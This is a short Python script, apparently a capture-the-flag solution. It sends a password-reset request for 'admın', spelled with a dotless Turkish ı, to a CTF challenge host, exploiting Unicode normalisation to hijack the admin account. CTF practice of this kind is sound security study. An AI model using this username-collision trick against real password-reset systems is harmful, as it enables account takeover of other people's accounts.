import requests

url = 'http://chall5.ctf.night-wolf.io/reset'

c=u'adm\u0131n'
myobj={'username': c}
print(c)
x = requests.post(url, data=myobj)
print(x.text)
